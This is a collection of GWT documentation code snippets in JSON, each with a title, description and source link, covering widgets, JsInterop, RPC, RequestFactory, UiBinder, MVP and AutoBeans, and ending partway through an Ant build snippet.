[
  {
    "owner": "gwtproject",
    "repo": "gwt-site",
    "content": "TITLE: Creating Composite Widget in GWT\nDESCRIPTION: Demonstrates how to create a custom composite widget that combines a TextBox and CheckBox in a VerticalPanel. The composite widget allows enabling/disabling the TextBox through the CheckBox control. It implements proper event handling and maintains encapsulation of internal components.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCustomWidgets.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.examples;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.event.dom.client.ClickHandler;\nimport com.google.gwt.user.client.ui.CheckBox;\nimport com.google.gwt.user.client.ui.Composite;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.google.gwt.user.client.ui.TextBox;\nimport com.google.gwt.user.client.ui.VerticalPanel;\nimport com.google.gwt.user.client.ui.Widget;\n\npublic class CompositeExample implements EntryPoint {\n\n  /**\n   * A composite of a TextBox and a CheckBox that optionally enables it.\n   */\n  private static class OptionalTextBox extends Composite implements\n      ClickHandler {\n\n    private TextBox textBox = new TextBox();\n    private CheckBox checkBox = new CheckBox();\n\n    /**\n     * Constructs an OptionalTextBox with the given caption on the check.\n     * \n     * @param caption the caption to be displayed with the check box\n     */\n    public OptionalTextBox(String caption) {\n      // Place the check above the text box using a vertical panel.\n      VerticalPanel panel = new VerticalPanel();\n      panel.add(checkBox);\n      panel.add(textBox);\n\n      // Set the check box's caption, and check it by default.\n      checkBox.setText(caption);\n      checkBox.setChecked(true);\n      checkBox.addClickHandler(this);\n\n      // All composites must call initWidget() in their constructors.\n      initWidget(panel);\n\n      // Give the overall composite a style name.\n      setStyleName(\"example-OptionalCheckBox\");\n    }\n\n    public void onClick(ClickEvent event) {\n      Object sender = event.getSource();\n      if (sender == checkBox) {\n        // When the check box is clicked, update the text box's enabled state.\n        textBox.setEnabled(checkBox.isChecked());\n      }\n    }\n\n    /**\n     * Sets the caption associated with the check box.\n     * \n     * @param caption the check box's caption\n     */\n    public void setCaption(String caption) {\n      // Note how we use the use composition of the contained widgets to provide\n      // only the methods that we want to.\n      checkBox.setText(caption);\n    }\n\n    /**\n     * Gets the caption associated with the check box.\n     * \n     * @return the check box's caption\n     */\n    public String getCaption() {\n      return checkBox.getText();\n    }\n  }\n\n  public void onModuleLoad() {\n    // Create an optional text box and add it to the root panel.\n    OptionalTextBox otb = new OptionalTextBox(\"Check this to enable me\");\n    RootPanel.get().add(otb);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Leaflet from GWT with JsInterop\nDESCRIPTION: This example shows how to use the wrapped Leaflet library in a GWT application. It initializes a Leaflet map using the JsInterop wrappers without writing any JavaScript.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npublic class Leafletwrapper implements EntryPoint {\n\n    double[] positions = { 51.505, -0.09 };\n\n    public void onModuleLoad() {\n        // it works\n        L.map(\"map\").setView(positions, 13);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Wrapping the Leaflet Map Library with JsInterop\nDESCRIPTION: This example shows how to wrap the Leaflet map JavaScript library using JsInterop. It creates native type wrappers for the global L object and Map class.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\n@JsType(isNative = true, namespace = JsPackage.GLOBAL)\npublic class L {\n\n    public static native Map map(String id);\n}\n```\n\n----------------------------------------\n\nTITLE: Editing Existing Entities with RequestFactory in Java GWT\nDESCRIPTION: Demonstrates how to make an existing EntityProxy editable using the RequestFactory's edit() method. This creates a mutable copy of an otherwise immutable proxy object, allowing changes to be tracked and sent to the server.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_18\n\nLANGUAGE: java\nCODE:\n```\nEmployeeProxy editableEmployee = request.edit(returnedEmployee);\neditableEmployee.setDepartment(newDepartment);\n...\nRequest<Void> updateReq = request.persist().using(editableEmployee);\n```\n\n----------------------------------------\n\nTITLE: Implementing Event Handling in a Custom GWT Cell\nDESCRIPTION: This example demonstrates how to create a custom ColorCell that extends AbstractCell to handle click and keydown events. The cell displays color names and responds to user interactions by showing an alert and updating values. It includes proper event sinking, handling, and rendering with SafeHtml templates.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCustomCells.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n/**\n * Example of creating a custom {@link Cell} that responds to events.\n */\npublic class CellWithEventsExample implements EntryPoint {\n\n  /**\n   * A custom {@link Cell} used to render a string that contains the name of a\n   * color.\n   */\n  static class ColorCell extends AbstractCell<String> {\n\n    /**\n     * The HTML templates used to render the cell.\n     */\n    interface Templates extends SafeHtmlTemplates {\n      /**\n       * The template for this Cell, which includes styles and a value.\n       * \n       * @param styles the styles to include in the style attribute of the div\n       * @param value the safe value. Since the value type is {@link SafeHtml},\n       *          it will not be escaped before including it in the template.\n       *          Alternatively, you could make the value type String, in which\n       *          case the value would be escaped.\n       * @return a {@link SafeHtml} instance\n       */\n      @SafeHtmlTemplates.Template(\"<div style=\\\"{0}\\\">{1}</div>\")\n      SafeHtml cell(SafeStyles styles, SafeHtml value);\n    }\n\n    /**\n     * Create a singleton instance of the templates used to render the cell.\n     */\n    private static Templates templates = GWT.create(Templates.class);\n\n    public ColorCell() {\n      /*\n       * Sink the click and keydown events. We handle click events in this\n       * class. AbstractCell will handle the keydown event and call\n       * onEnterKeyDown() if the user presses the enter key while the cell is\n       * selected.\n       */\n      super(\"click\", \"keydown\");\n    }\n\n    /**\n     * Called when an event occurs in a rendered instance of this Cell. The\n     * parent element refers to the element that contains the rendered cell, NOT\n     * to the outermost element that the Cell rendered.\n     */\n    @Override\n    public void onBrowserEvent(Context context, Element parent, String value, NativeEvent event,\n        ValueUpdater<String> valueUpdater) {\n      // Let AbstractCell handle the keydown event.\n      super.onBrowserEvent(context, parent, value, event, valueUpdater);\n\n      // Handle the click event.\n      if (\"click\".equals(event.getType())) {\n        // Ignore clicks that occur outside of the outermost element.\n        EventTarget eventTarget = event.getEventTarget();\n        if (parent.getFirstChildElement().isOrHasChild(Element.as(eventTarget))) {\n          doAction(value, valueUpdater);\n        }\n      }\n    }\n\n    @Override\n    public void render(Context context, String value, SafeHtmlBuilder sb) {\n      /*\n       * Always do a null check on the value. Cell widgets can pass null to\n       * cells if the underlying data contains a null, or if the data arrives\n       * out of order.\n       */\n      if (value == null) {\n        return;\n      }\n\n      // If the value comes from the user, we escape it to avoid XSS attacks.\n      SafeHtml safeValue = SafeHtmlUtils.fromString(value);\n\n      // Use the template to create the Cell's html.\n      SafeStyles styles = SafeStylesUtils.forTrustedColor(safeValue.asString());\n      SafeHtml rendered = templates.cell(styles, safeValue);\n      sb.append(rendered);\n    }\n\n    /**\n     * onEnterKeyDown is called when the user presses the ENTER key will the\n     * Cell is selected. You are not required to override this method, but its a\n     * common convention that allows your cell to respond to key events.\n     */\n    @Override\n    protected void onEnterKeyDown(Context context, Element parent, String value, NativeEvent event,\n        ValueUpdater<String> valueUpdater) {\n      doAction(value, valueUpdater);\n    }\n\n    private void doAction(String value, ValueUpdater<String> valueUpdater) {\n      // Alert the user that they selected a value.\n      Window.alert(\"You selected the color \" + value);\n\n      // Trigger a value updater. In this case, the value doesn't actually\n      // change, but we use a ValueUpdater to let the app know that a value\n      // was clicked.\n      valueUpdater.update(value);\n    }\n  }\n\n  /**\n   * The list of data to display.\n   */\n  private static final List<String> COLORS = Arrays.asList(\"red\", \"green\", \"blue\", \"violet\",\n      \"black\", \"gray\");\n\n  @Override\n  public void onModuleLoad() {\n    // Create a cell to render each value.\n    ColorCell cell = new ColorCell();\n\n    // Use the cell in a CellList.\n    CellList<String> cellList = new CellList<String>(cell);\n\n    // Push the data into the widget.\n    cellList.setRowData(0, COLORS);\n\n    // Add it to the root panel.\n    RootPanel.get().add(cellList);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Host Page for StockWatcher GWT Application\nDESCRIPTION: Complete HTML structure for the StockWatcher host page. This file embeds the GWT application through a div with id \"stockList\" and includes the necessary script references and fallback content for users without JavaScript.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n    <link type=\"text/css\" rel=\"stylesheet\" href=\"StockWatcher.css\">\n    <title>StockWatcher</title>\n    <script type=\"text/javascript\" language=\"javascript\" src=\"stockwatcher/stockwatcher.nocache.js\"></script>\n  </head>\n  <body>\n    <h1>StockWatcher</h1>\n    <div id=\"stockList\"></div>\n    <iframe src=\"javascript:''\" id=\"__gwt_historyFrame\" tabIndex='-1' style=\"position:absolute;width:0;height:0;border:0\"></iframe>\n    <noscript>\n      <div style=\"width: 22em; position: absolute; left: 50%; margin-left: -11em; color: red; background-color: white; border: 1px solid red; padding: 4px; font-family: sans-serif\">\n        Your web browser must have JavaScript enabled\n        in order for this application to display correctly.\n      </div>\n    </noscript>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Implementing Activity Class in GWT\nDESCRIPTION: Example of implementing an Activity class that extends AbstractActivity to handle view presentation and user interactions. Shows core lifecycle methods like start() and mayStop(), and demonstrates integration with views and place navigation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\npublic class HelloActivity extends AbstractActivity implements HelloView.Presenter {\n    // Used to obtain views, eventBus, placeController\n    // Alternatively, could be injected via GIN\n    private ClientFactory clientFactory;\n    // Name that will be appended to \"Hello,\"\n    private String name;\n\n    public HelloActivity(HelloPlace place, ClientFactory clientFactory) {\n        this.name = place.getHelloName();\n        this.clientFactory = clientFactory;\n    }\n\n    /**\n     * Invoked by the ActivityManager to start a new Activity\n     */\n    @Override\n    public void start(AcceptsOneWidget containerWidget, EventBus eventBus) {\n        HelloView helloView = clientFactory.getHelloView();\n        helloView.setName(name);\n        helloView.setPresenter(this);\n        containerWidget.setWidget(helloView.asWidget());\n    }\n\n    /**\n     * Ask user before stopping this activity\n     */\n    @Override\n    public String mayStop() {\n        return \"Please hold on. This activity is stopping.\";\n    }\n\n    /**\n     * Navigate to a new Place in the browser\n     */\n    public void goTo(Place place) {\n        clientFactory.getPlaceController().goTo(place);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using JavaScript Callbacks from Java with Lambda Expressions\nDESCRIPTION: This snippet demonstrates how to use a JavaScript callback from Java code using Lambda expressions. It creates a button element and adds a click event listener.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nElement element = DomGlobal.document.createElement(\"button\");\n// using Java 8 syntax\nelement.addEventListener(\"click\", (event) -> {\n\n    GWT.log(\"clicked!\");\n});\n```\n\n----------------------------------------\n\nTITLE: Making GWT RPC Call Implementation\nDESCRIPTION: Example showing how to make an RPC call from client-side code, including creating the service proxy, implementing the callback, and executing the call.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic void menuCommandEmptyInbox() {\n  // (1) Create the client proxy. Note that although you are creating the\n  // service interface proper, you cast the result to the asynchronous\n  // version of the interface. The cast is always safe because the\n  // generated proxy implements the asynchronous interface automatically.\n  //\n  MyEmailServiceAsync emailService = (MyEmailServiceAsync) GWT.create(MyEmailService.class);\n\n  // (2) Create an asynchronous callback to handle the result.\n  //\n  AsyncCallback callback = new AsyncCallback() {\n    public void onSuccess(Void result) {\n      // do some UI stuff to show success\n    }\n\n    public void onFailure(Throwable caught) {\n      // do some UI stuff to show failure\n    }\n  };\n\n  // (3) Make the call. Control flow will continue immediately and later\n  // 'callback' will be invoked when the RPC completes.\n  //\n  emailService.emptyMyInbox(fUsername, fPassword, callback);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating StockData Overlay Type in Java\nDESCRIPTION: Implementation of a GWT overlay type that extends JavaScriptObject to handle stock data. Includes JSNI methods for accessing JSON fields and calculating change percentages.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.core.client.JavaScriptObject;\n\nclass StockData extends JavaScriptObject {                              \n  protected StockData() {}                                              \n\n  public final native String getSymbol() /*-{ return this.symbol; }-*/; \n  public final native double getPrice() /*-{ return this.price; }-*/;\n  public final native double getChange() /*-{ return this.change; }-*/;\n\n  public final double getChangePercent() {\n    return 100.0 * getChange() / getPrice();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining GWT RPC Service Interface in Java\nDESCRIPTION: This snippet demonstrates how to create the StockPriceService interface, which extends RemoteService. It defines the getPrices method that will be implemented on the server-side to fetch stock prices.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.user.client.rpc.RemoteService;\nimport com.google.gwt.user.client.rpc.RemoteServiceRelativePath;\n\n@RemoteServiceRelativePath(\"stockPrices\")\npublic interface StockPriceService extends RemoteService {\n\n  StockPrice[] getPrices(String[] symbols);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Asynchronous RPC Calls in GWT\nDESCRIPTION: Example demonstrating proper implementation of asynchronous RPC calls in GWT using AsyncCallback. Shows how to handle both successful responses and failures while providing status updates to the user.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\n// This code is called before the RPC starts\n //\n  if (startRow == lastStartRow) {\n    ...\n  }\n\n  // Invoke the RPC call, implementing the callback methods inline:\n  //\n  calService.getPeople(startRow, maxRows, new AsyncCallback<Person[]>() {\n\n    // When the RPC returns, this code will be called if the RPC fails\n    public void onFailure(Throwable caught) {\n       statusLabel.setText(\"Query failed: \" + caught.getMessage());\n       acceptor.failed(caught);\n    }\n\n    // When the RPC returns, this code is called if the RPC succeeds\n    public void onSuccess(Person[] result) {\n      lastStartRow = startRow;\n      lastMaxRows = maxRows;\n      lastPeople = result;\n      pushResults(acceptor, startRow, result);\n      statusLabel.setText(\"Query reutrned \" + result.length + \" rows.\");\n    }\n  });\n\n  // The above method call will not block, but return immediately.\n  // The following code will execute while the RPC is in progress,\n  // before either of onFailure() or onSuccess() are executed.\n  //\n  statusLabel.setText(\"Query in progress...\");\n  ...\n```\n\n----------------------------------------\n\nTITLE: Client-side Random Stock Price Generation Method\nDESCRIPTION: Original implementation of the refreshWatchList method that generates random stock prices in the client-side code. This will be replaced with server-side data retrieval.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Generate random stock prices.\n */\nprivate void refreshWatchList() {\n  final double MAX_PRICE = 100.0; // $100.00\n  final double MAX_PRICE_CHANGE = 0.02; // +/- 2%\n\n  StockPrice[] prices = new StockPrice[stocks.size()];\n  for (int i = 0; i < stocks.size(); i++) {\n    double price = Random.nextDouble() * MAX_PRICE;\n    double change = price * MAX_PRICE_CHANGE\n        * (Random.nextDouble() * 2.0 - 1.0);\n\n    prices[i] = new StockPrice(stocks.get(i), price, change);\n  }\n\n  updateTable(prices);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Synchronous RPC Service Interface in GWT\nDESCRIPTION: Creates a client-side Java interface that extends RemoteService to define the service contract for server communication. This synchronous interface serves as the definitive specification of the service's API.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage com.example.foo.client;\n\nimport com.google.gwt.user.client.rpc.RemoteService;\n\npublic interface MyService extends RemoteService {\n  public String myMethod(String s);\n}\n```\n\n----------------------------------------\n\nTITLE: Firing RequestFactory Requests with Callback in Java GWT\nDESCRIPTION: Shows how to execute a RequestFactory request by calling the fire() method with a Receiver that handles the server response. The Receiver's onSuccess method is called when the request completes successfully.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_17\n\nLANGUAGE: java\nCODE:\n```\ncreateReq.fire(new Receiver<Void>()\n{\n  @Override\n    public void onSuccess(Void arg0)\n    {\n        // Update display\n    }\n});\n```\n\n----------------------------------------\n\nTITLE: Creating UiBinder XML Template for TodoList Application in GWT\nDESCRIPTION: This XML file defines the UI structure for the Main component using GWT's UiBinder. It creates an empty HTMLPanel that will later contain the application's UI elements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n             xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n  <g:HTMLPanel>\n\n  </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing an Entity Class with Service Methods in Java\nDESCRIPTION: This snippet demonstrates a JPA Entity class (Employee) with static service methods for finding all employees and finding a specific employee by ID. It also includes instance methods for persistence operations (persist and remove) that are required by RequestFactory.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\n// The Employee domain object\n@Entity public class Employee {\n\n// properties, getters, and setters omitted\n  public static List<Employee> findAllEmployees() {\n    EntityManager em = entityManager();\n    try {\n      List<Employee> list = em.createQuery(\"select o from Employee o\").getResultList();\n      // force to get all the employees\n      list.size();\n      return list;\n    } finally {\n      em.close();\n    }\n  }\n\n  public static Employee findEmployee(Long id) {\n    if (id == null) {\n      return null;\n    }\n    EntityManager em = entityManager();\n    try {\n      Employee employee = em.find(Employee.class, id);\n      return employee;\n    } finally {\n      em.close();\n    }\n  }\n\n  public static final EntityManager entityManager() {\n    return EMF.get().createEntityManager();\n  }\n\n  public void persist() {\n    EntityManager em = entityManager();\n    try {\n      em.persist(this);\n    } finally {\n      em.close();\n    }\n  }\n\n  public void remove() {\n    EntityManager em = entityManager();\n    try {\n      Employee attached = em.find(Employee.class, this.id);\n      em.remove(attached);\n    } finally {\n      em.close();\n    }\n  }\n\n  ...\n\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a GWT RPC Service on the Server Side\nDESCRIPTION: Creates a server-side implementation of the RPC service by extending RemoteServiceServlet and implementing the service interface defined earlier. This class contains the actual business logic that will be executed on the server.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npackage com.example.foo.server;\n\nimport com.google.gwt.user.server.rpc.RemoteServiceServlet;\nimport com.example.foo.client.MyService;\n\n\npublic class MyServiceImpl extends RemoteServiceServlet implements\n    MyService {\n\n  public String myMethod(String s) {\n    // Do something interesting with 's' here on the server.\n    return s;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing JSONP Request in GWT with JsonpRequestBuilder\nDESCRIPTION: Updated refreshWatchList method that uses JsonpRequestBuilder to make cross-domain requests for stock data, handling both success and failure cases.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Generate random stock prices.\n */\nprivate void refreshWatchList() {\n  if (stocks.size() == 0) {\n    return;\n  }\n\n  String url = JSON_URL;\n\n  // Append watch list stock symbols to query URL.\n  Iterator<String> iter = stocks.iterator();\n  while (iter.hasNext()) {\n    url += iter.next();\n    if (iter.hasNext()) {\n      url += \"+\";\n    }\n  }\n\n  url = URL.encode(url);\n\n  JsonpRequestBuilder builder = new JsonpRequestBuilder();\n  builder.requestObject(url, new AsyncCallback<JsArray<StockData>>() {\n    public void onFailure(Throwable caught) {\n      displayError(\"Couldn't retrieve JSON\");\n    }\n    public void onSuccess(JsArray<StockData> data) {\n      // TODO handle JSON response\n    }\n  });\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GWT RPC Service in Java\nDESCRIPTION: This snippet shows the initial implementation of the StockPriceServiceImpl class, which extends RemoteServiceServlet and implements the StockPriceService interface. It includes a stub for the getPrices method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.server;\n\nimport com.google.gwt.sample.stockwatcher.client.StockPrice;\nimport com.google.gwt.sample.stockwatcher.client.StockPriceService;\nimport com.google.gwt.user.server.rpc.RemoteServiceServlet;\n\npublic class StockPriceServiceImpl extends RemoteServiceServlet implements StockPriceService {\n\n  public StockPrice[] getPrices(String[] symbols) {\n    // TODO Auto-generated method stub\n    return null;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Asynchronous RPC Service Interface in GWT\nDESCRIPTION: Defines the asynchronous interface that client-side code will use to make non-blocking calls to the server. Methods take an additional AsyncCallback parameter to handle responses when they return from the server.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npackage com.example.foo.client;\n\ninterface MyServiceAsync {\n  public void myMethod(String s, AsyncCallback<String> callback);\n}\n```\n\n----------------------------------------\n\nTITLE: Exporting a Java Type to JavaScript with @JsType\nDESCRIPTION: This snippet demonstrates how to expose a Java class to JavaScript using the @JsType annotation. The class includes a field, constructor, and method that will all be accessible from JavaScript code.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage com.gwt.example;\n\n@JsType\npublic class MyClass {\n\n  public String name;\n\n  public MyClass(String name) {\n    this.name = name;\n  }\n\n  public String sayHello() {\n    return \"Hello \" + this.name;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Exposing Java Methods with Callback Arguments\nDESCRIPTION: This snippet shows how to expose Java methods that accept or return callback functions using @JsFunction. It includes a functional interface and static methods that work with it.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npackage com.example;\n\n@JsType\npublic class Bar {\n    @JsFunction\n    public interface Foo {\n        int exec(int x);\n    }\n\n    public static int action1(Foo foo) {\n        return foo.exec(40);\n    }\n\n    public static Foo action2() {\n        return (x) -> x + 2;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing UiBinder Owner Class with Widgets in Java\nDESCRIPTION: Demonstrates a Java class that owns a UiBinder template with widgets. It shows how to extend Composite, bind the UI, and interact with the widgets declared in the template.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\npublic class HelloWidgetWorld extends Composite {\n\n  interface MyUiBinder extends UiBinder<Widget, HelloWidgetWorld> {}\n  private static final MyUiBinder uiBinder = GWT.create(MyUiBinder.class);\n\n  @UiField ListBox listBox;\n\n  public HelloWidgetWorld(String... names) {\n    // sets listBox\n    initWidget(uiBinder.createAndBindUi(this));\n    for (String name : names) {\n      listBox.addItem(name);\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Stock to FlexTable in GWT StockWatcher\nDESCRIPTION: Adds a new stock symbol to both the ArrayList data structure and the FlexTable display. The code gets the current row count, adds the symbol to the ArrayList, and sets the text in the first column of the new row.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n// Add the stock to the table.\nint row = stocksFlexTable.getRowCount();\nstocks.add(symbol);\nstocksFlexTable.setText(row, 0, symbol);\n```\n\n----------------------------------------\n\nTITLE: Defining GWT RPC Service Interface\nDESCRIPTION: Example of defining a GWT RPC service interface with RemoteServiceRelativePath annotation. Shows the synchronous interface definition that extends RemoteService.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n// The RemoteServiceRelativePath annotation automatically calls setServiceEntryPoint()\n@RemoteServiceRelativePath(\"email\")\npublic interface MyEmailService extends RemoteService {\n  void emptyMyInbox(String username, String password);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ClientFactory in GWT MVP\nDESCRIPTION: A concrete implementation of the ClientFactory interface that provides application-wide objects like EventBus, PlaceController, and view implementations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\npublic class ClientFactoryImpl implements ClientFactory {\n    private final EventBus eventBus = new SimpleEventBus();\n    private final PlaceController placeController = new PlaceController(eventBus);\n    private final HelloView helloView = new HelloViewImpl();\n    private final GoodbyeView goodbyeView = new GoodbyeViewImpl();\n\n    @Override\n    public EventBus getEventBus() {\n        return eventBus;\n    }\n    ...\n}\n```\n\n----------------------------------------\n\nTITLE: AutoBean Basic Usage Example\nDESCRIPTION: Demonstrates core AutoBean functionality including interface definitions, factory creation, serialization and deserialization of bean objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n// Declare any bean-like interface with matching getters and setters, no base type is necessary\ninterface Person {\n  Address getAddress();\n  String getName();\n  void setName(String name);\n  void setAddress(Address a);\n}\n\ninterface Address {\n  // Other properties, as above\n}\n\n// Declare the factory type\ninterface MyFactory extends AutoBeanFactory {\n  AutoBean<Address> address();\n  AutoBean<Person> person();\n}\n\nclass DoSomething() {\n  // Instantiate the factory\n  MyFactory factory = GWT.create(MyFactory.class);\n  // In non-GWT code, use AutoBeanFactorySource.create(MyFactory.class);\n\n  Person makePerson() {\n    // Construct the AutoBean\n    AutoBean<Person> person = factory.person();\n\n    // Return the Person interface shim\n    return person.as();\n  }\n\n  String serializeToJson(Person person) {\n    // Retrieve the AutoBean controller\n    AutoBean<Person> bean = AutoBeanUtils.getAutoBean(person);\n\n    return AutoBeanCodex.encode(bean).getPayload();\n  }\n\n  Person deserializeFromJson(String json) {\n    AutoBean<Person> bean = AutoBeanCodex.decode(factory, Person.class, json);\n    return bean.as();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Service Proxy and Callback Implementation - Java\nDESCRIPTION: Client-side implementation for making remote procedure calls with async callbacks\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\nprivate ArrayList<String> stocks = new ArrayList<String>();\nprivate StockPriceServiceAsync stockPriceSvc = GWT.create(StockPriceService.class);\n```\n\nLANGUAGE: java\nCODE:\n```\nprivate void refreshWatchList() {\n  // Initialize the service proxy.\n  if (stockPriceSvc == null) {\n    stockPriceSvc = GWT.create(StockPriceService.class);\n  }\n\n  // Set up the callback object.\n  AsyncCallback<StockPrice[]> callback = new AsyncCallback<StockPrice[]>() {\n    public void onFailure(Throwable caught) {\n      // TODO: Do something with errors.\n    }\n\n    public void onSuccess(StockPrice[] result) {\n      updateTable(result);\n    }\n  };\n\n  // Make the call to the stock price service.\n  stockPriceSvc.getPrices(stocks.toArray(new String[0]), callback);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Ant Build for GWT Development Mode\nDESCRIPTION: An example Ant build.xml target that launches GWT in development mode with proper classpath configuration, JVM arguments, and module specifications.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<target name=\"devmode\" depends=\"javac\" description=\"Run development mode\">\n  <java failonerror=\"true\" fork=\"true\" classname=\"com.google.gwt.dev.DevMode\">\n    <classpath>\n      <pathelement location=\"src\"/>\n      <path refid=\"project.class.path\"/>\n    </classpath>\n    <jvmarg value=\"-Xmx256M\"/>\n    <arg value=\"-startupUrl\"/>\n    <arg value=\"Hello.html\"/>\n    <!-- Additional arguments like -style PRETTY or -logLevel DEBUG -->\n    <arg value=\"com.google.gwt.sample.hello.Hello\"/>\n  